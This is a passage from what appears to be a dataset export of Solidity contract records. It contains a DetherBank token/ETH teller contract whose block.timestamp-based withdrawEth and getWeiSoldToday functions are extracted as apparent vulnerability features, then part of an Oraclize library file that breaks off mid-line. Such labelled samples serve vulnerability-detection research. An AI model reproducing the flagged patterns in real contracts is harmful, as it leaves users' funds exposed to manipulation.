YEAR_IN_SECONDS;\n }\n }\n uint8[12] memory monthDayCounts;\n monthDayCounts[0] = 31;\n if (isLeapYear(year)) {\n monthDayCounts[1] = 29;\n }\n else {\n monthDayCounts[1] = 28;\n }\n monthDayCounts[2] = 31;\n monthDayCounts[3] = 30;\n monthDayCounts[4] = 31;\n monthDayCounts[5] = 30;\n monthDayCounts[6] = 31;\n monthDayCounts[7] = 31;\n monthDayCounts[8] = 30;\n monthDayCounts[9] = 31;\n monthDayCounts[10] = 30;\n monthDayCounts[11] = 31;\n for (i = 1; i < month; i++) {\n timestamp += DAY_IN_SECONDS * monthDayCounts[i - 1];\n }\n timestamp += DAY_IN_SECONDS * (day - 1);\n timestamp += HOUR_IN_SECONDS * (hour);\n timestamp += MINUTE_IN_SECONDS * (minute);\n timestamp += second;\n return timestamp;\n }\n}\ncontract DetherBank is ERC223ReceivingContract, Ownable, SafeMath, DateTime {\n using BytesLib for bytes;\n event receiveDth(address _from, uint amount);\n event receiveEth(address _from, uint amount);\n event sendDth(address _from, uint amount);\n event sendEth(address _from, uint amount);\n mapping(address => uint) public dthShopBalance;\n mapping(address => uint) public dthTellerBalance;\n mapping(address => uint) public ethShopBalance;\n mapping(address => uint) public ethTellerBalance;\n mapping(address => mapping(uint16 => mapping(uint16 => mapping(uint16 => uint256)))) ethSellsUserToday;\n ERC223Basic public dth;\n bool public isInit = false;\n function setDth (address _dth) external onlyOwner {\n require(!isInit);\n dth = ERC223Basic(_dth);\n isInit = true;\n }\n function withdrawDthTeller(address _receiver) external onlyOwner {\n require(dthTellerBalance[_receiver] > 0);\n uint tosend = dthTellerBalance[_receiver];\n dthTellerBalance[_receiver] = 0;\n require(dth.transfer(_receiver, tosend));\n }\n function withdrawDthShop(address _receiver) external onlyOwner {\n require(dthShopBalance[_receiver] > 0);\n uint tosend = dthShopBalance[_receiver];\n dthShopBalance[_receiver] = 0;\n require(dth.transfer(_receiver, tosend));\n }\n function withdrawDthShopAdmin(address _from, address _receiver) external onlyOwner {\n require(dthShopBalance[_from] > 0);\n uint tosend = dthShopBalance[_from];\n dthShopBalance[_from] = 0;\n require(dth.transfer(_receiver, tosend));\n }\n function addTokenShop(address _from, uint _value) external onlyOwner {\n dthShopBalance[_from] = SafeMath.add(dthShopBalance[_from], _value);\n }\n function addTokenTeller(address _from, uint _value) external onlyOwner{\n dthTellerBalance[_from] = SafeMath.add(dthTellerBalance[_from], _value);\n }\n function addEthTeller(address _from, uint _value) external payable onlyOwner returns (bool) {\n ethTellerBalance[_from] = SafeMath.add(ethTellerBalance[_from] ,_value);\n return true;\n }\n function getDateInfo(uint timestamp) internal view returns(_DateTime) {\n _DateTime memory date = parseTimestamp(timestamp);\n return date;\n }\n function withdrawEth(address _from, address _to, uint _amount) external onlyOwner {\n require(ethTellerBalance[_from] >= _amount);\n ethTellerBalance[_from] = SafeMath.sub(ethTellerBalance[_from], _amount);\n uint256 weiSoldToday = getWeiSoldToday(_from);\n _DateTime memory date = getDateInfo(block.timestamp);\n ethSellsUserToday[_from][date.day][date.month][date.year] = SafeMath.add(weiSoldToday, _amount);\n _to.transfer(_amount);\n }\n function refundEth(address _from) external onlyOwner {\n uint toSend = ethTellerBalance[_from];\n if (toSend > 0) {\n ethTellerBalance[_from] = 0;\n _from.transfer(toSend);\n }\n }\n function getDthTeller(address _user) public view returns (uint) {\n return dthTellerBalance[_user];\n }\n function getDthShop(address _user) public view returns (uint) {\n return dthShopBalance[_user];\n }\n function getEthBalTeller(address _user) public view returns (uint) {\n return ethTellerBalance[_user];\n }\n function getWeiSoldToday(address _user) public view returns (uint256 weiSoldToday) {\n _DateTime memory date = getDateInfo(block.timestamp);\n weiSoldToday = ethSellsUserToday[_user][date.day][date.month][date.year];\n }\n function tokenFallback(address _from, uint _value, bytes _data) {\n require(msg.sender == address(dth));\n }\n}",
  "extract_feature": [
    "function withdrawEth(address _from, address _to, uint _amount) external onlyOwner {\nrequire(ethTellerBalance[_from] >= _amount);\nethTellerBalance[_from] = SafeMath.sub(ethTellerBalance[_from], _amount);\nuint256 weiSoldToday = getWeiSoldToday(_from);\n_DateTime memory date = getDateInfo(block.timestamp);\nethSellsUserToday[_from][date.day][date.month][date.year] = SafeMath.add(weiSoldToday, _amount);\n_to.transfer(_amount);\n}",
    "function getWeiSoldToday(address _user) public view returns (uint256 weiSoldToday) {\n_DateTime memory date = getDateInfo(block.timestamp);\nweiSoldToday = ethSellsUserToday[_user][date.day][date.month][date.year];\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f92"
  },
  "filename": "9750.sol",
  "content": "pragma solidity ^0.4.20;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n function setConfig(bytes32 _config);\n function setCustomGasPrice(uint _gasPrice);\n function randomDS_getSessionPubKeyHash() returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0)) oraclize_setNetwork(networkID_auto);\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n }\n function oraclize_useCoupon(string code) oraclizeAPI internal {\n oraclize.useCoupon(code);\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_setConfig(bytes32 config) oraclizeAPI internal {\n return oraclize.setConfig(config);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n function stra2cbor(string[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += 